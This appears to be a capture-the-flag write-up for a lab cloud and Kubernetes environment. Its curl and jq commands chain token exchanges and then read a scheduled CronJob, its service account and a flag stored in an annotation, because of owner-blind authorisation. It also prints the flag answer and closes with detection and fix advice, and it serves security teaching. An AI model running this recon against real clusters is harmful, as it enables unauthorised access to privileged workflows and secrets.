## Where this happens

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | Exposed scheduler object: the support CronJob's identity, trigger and startup command are readable through the cloud API by a delegated export role |
| **Tools** | `curl`, `jq` |
| **Attack surface** | `GET /api/schedules/SCHED-2841` with the export JWT; CronJob `sched-2841` annotation |
| **Prerequisite** | The export JWT from K14.2 |
| **Flag** | `FLAG{25a027fe80e77ca0}` |

**What you are about to read:** the actual schedule record and the live CronJob cross-check. The
flag is stored twice — in the cloud API record and in the CronJob's
`fieldkest.io/access-token` annotation.

## Objective

> Recover the scheduled support workflow that will run after the current operator's shift ends.

Support does not sit at the desk overnight. A schedule fires at 08:00, runs as a dedicated
service account, and processes the ARWC case. The card asks for that workflow — its trigger, its
identity, and the configuration it will use.

## Background you need

A CronJob has two halves:

- **when** it fires (`schedule`, e.g. `0 8 * * *`);
- **what** fires (`jobTemplate`: container image, command, env, `serviceAccountName`).

A readable schedule is a recon target because it describes unattended privileged execution:

1. *When* will something run without a human? (a window for racing or planting input)
2. *As whom* will it run? (`svc-schedule-runner`, not an interactive account)
3. *What* does it consume? (`STARTUP_CONFIG=EXP-2841`, `NEXT_ASSIGNMENT=field-operator-b`)

The cloud API mirrors the Kubernetes object. The export role can read both.

## Walkthrough

### 1. Get the export JWT

K14.2 establishes the role. Repeat the two exchanges:

```bash
C="curl -sSk -m 20 --socks5-hostname 127.0.0.1:1080"
B=https://cloud-api.keplerops.test
K=https://cloud-api.keplerops.test:6443
U="rowan.ito:fk_developer_…"

WT=$($C -u "$U" -X POST -H 'Content-Type: application/json' -d '{}' \
  "$B/api/workspaces/current/token-exchange" | jq -r .access_token)
EJ=$($C -X POST -H "Authorization: Bearer $WT" \
  -H 'Content-Type: application/json' -d '{}' \
  "$B/api/token-exchange/fieldkest-export-access" | jq -r .access_token)
```

### 2. Read the schedule record

```bash
$C -H "Authorization: Bearer $EJ" "$B/api/schedules/SCHED-2841"
```

```json
{
  "allowed_startup_hooks": [
    {"argv": ["fk-support-export", "--export", "EXP-2841"]}
  ],
  "assignment": "CAS-MAYA-2841",
  "case_id": "CAS-MAYA-2841",
  "cron": "0 8 * * *",
  "destination": "fieldkest-exports",
  "flag": "FLAG{25a027fe80e77ca0}",
  "next_assignment": "field-operator-b",
  "profile": "support-export",
  "schedule_id": "SCHED-2841",
  "schema": "fieldkest.schedule/v1",
  "startup_config": "EXP-2841",
  "startup_hook": null
}
```

The fields answer the card directly:

- `cron: "0 8 * * *"` — the run after the operator's shift.
- `assignment: "CAS-MAYA-2841"` — the ARWC case this run owns.
- `next_assignment: "field-operator-b"` — the shift handover target (K16.4).
- `startup_config: "EXP-2841"` — the export the workflow will produce.
- `flag` — the value for this card.

### 3. Cross-check the live CronJob

The same identity can read the Kubernetes object:

```bash
$C -H "Authorization: Bearer $EJ" \
  "$K/apis/batch/v1/namespaces/fieldlink/cronjobs/sched-2841"
```

Relevant parts of the object:

```json
{
  "metadata": {
    "name": "sched-2841",
    "namespace": "fieldlink",
    "labels": {
      "fieldkest.io/case-id": "CAS-MAYA-2841",
      "fieldkest.io/kind": "support-schedule",
      "fieldkest.io/schedule-id": "SCHED-2841"
    },
    "annotations": {
      "fieldkest.io/access-token": "FLAG{25a027fe80e77ca0}"
    }
  },
  "spec": {
    "schedule": "0 8 * * *",
    "jobTemplate": {
      "spec": {
        "template": {
          "spec": {
            "serviceAccountName": "svc-schedule-runner",
            "containers": [{
              "name": "exporter",
              "envFrom": [
                {"secretRef": {"name": "sched-2841-runner-credentials"}}
              ]
            }]
          }
        }
      }
    }
  }
}
```

The annotation carries the same flag. The container also references a secret
(`sched-2841-runner-credentials`) that supplies `STARTUP_TOKEN` and `HANDOVER_TOKEN`; the export
role cannot read that secret or the pod logs. That limitation is the K16.3/K16.4 seam, not a
problem for this card.

## Why this works

The schedule is a control-plane object that *causes* privileged execution later, yet it is
treated as operational metadata. The cloud API authorises on "may this caller read schedules at
all", not "does this caller own this schedule". The export role therefore reads a workflow
created by the support team, including:

- the service account it will run as (`svc-schedule-runner`);
- the exact trigger (`0 8 * * *`);
- the startup configuration (`EXP-2841`);
- the next handover target (`field-operator-b`);
- a flag stored in a convenient annotation.

The flag is duplicated in the API record and the CronJob annotation — a common pattern when an
internal tool prints its own state into every representation. Both are readable to the same
delegated role.

## Detection and fix

- **Signal:** reads of `schedules`/CronJobs by a role that does not own them; a schedule record
  being fetched from the workstation subnet; tokens in annotations.
- **Fix:**
  1. Authorise schedule reads by owner/tenant, not by "any authenticated service".
  2. Move tokens out of annotations and into Secrets; do not mirror them in API views.
  3. Restrict the export role to the export definition/job, not the scheduler.
  4. Alert on `get cronjobs` and on cloud-API schedule reads by non-support principals.

## Notes and dead ends

- This card is pure disclosure: the flag arrives before any modification.
- The schedule record was later PATCHed while investigating K16.4
  (`assignment` changed to `field-operator-b`). The `flag` field stayed the same; do not
  resubmit it.
- The CronJob's live command references `$MARKER`, `$STARTUP_TOKEN` and `$HANDOVER_TOKEN`.
  K16.2 uses `MARKER`; K16.3/K16.4 need the secret values.
- The reconstruction guessed a generic `jobTemplate` path and a `review.keplerops.test`
  rehearsal. The actual read path is the cloud API schedule record plus the k3s CronJob object
  shown above.
